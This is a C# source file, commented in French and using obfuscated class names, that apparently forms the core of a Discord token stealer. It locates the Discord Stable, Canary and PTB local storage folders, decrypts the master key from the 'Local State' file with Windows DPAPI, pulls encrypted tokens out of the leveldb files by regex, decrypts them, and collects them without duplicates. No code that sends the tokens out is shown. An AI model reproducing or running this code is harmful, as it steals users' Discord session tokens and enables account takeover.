using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using X.A;

namespace OdPS
{
    // Petite structure pour stocker le token et sa provenance
    public class DiscordAccount
    {
        public string Token { get; set; }
        public string Source { get; set; }
    }

    internal static class TX
    {
        private static byte[] GetKey(string path)
        {
            try
            {
                string localState = Path.Combine(new DirectoryInfo(path).Parent.Parent.FullName, "Local State");
                if (!File.Exists(localState)) return null;
                string json = File.ReadAllText(localState);
                JObject data = JObject.Parse(json);
                byte[] decodedKey = Convert.FromBase64String(data["os_crypt"]["encrypted_key"].ToString());
                byte[] masterKey = new byte[decodedKey.Length - 5];
                Array.Copy(decodedKey, 5, masterKey, 0, decodedKey.Length - 5);
                return ProtectedData.Unprotect(masterKey, null, DataProtectionScope.CurrentUser);
            }
            catch { return null; }
        }

        internal static List<DiscordAccount> GetTokens()
        {
            List<DiscordAccount> accounts = new List<DiscordAccount>();
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            // Dictionnaire pour mapper le chemin au nom lisible
            var targets = new Dictionary<string, string> {
                { Path.Combine(roaming, "discord", "Local Storage", "leveldb"), "Discord Stable" },
                { Path.Combine(roaming, "discordcanary", "Local Storage", "leveldb"), "Discord Canary" },
                { Path.Combine(roaming, "discordptb", "Local Storage", "leveldb"), "Discord PTB" }
            };

            foreach (var target in targets)
            {
                if (!Directory.Exists(target.Key)) continue;
                byte[] currentKey = GetKey(target.Key);
                if (currentKey == null) continue;

                foreach (string file in Directory.GetFiles(target.Key, "*", SearchOption.TopDirectoryOnly))
                {
                    try
                    {
                        string content;
                        using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                        using (StreamReader reader = new StreamReader(fs)) { content = reader.ReadToEnd(); }

                        foreach (Match m in Regex.Matches(content, @"dQw4w9WgXcQ:[^""]+"))
                        {
                            string raw = m.Value.Split(':')[1].Replace("\"", "").Trim();
                            string decrypted = Z.P(raw, currentKey);

                            if (!string.IsNullOrEmpty(decrypted))
                            {
                                // GESTION DES DOUBLONS : On ne l'ajoute que si le token n'est pas déjà dans la liste
                                if (!accounts.Any(a => a.Token == decrypted))
                                {
                                    accounts.Add(new DiscordAccount { Token = decrypted, Source = target.Value });
                                }
                            }
                        }
                    }
                    catch { }
                }
            }
            return accounts;
        }
    }
}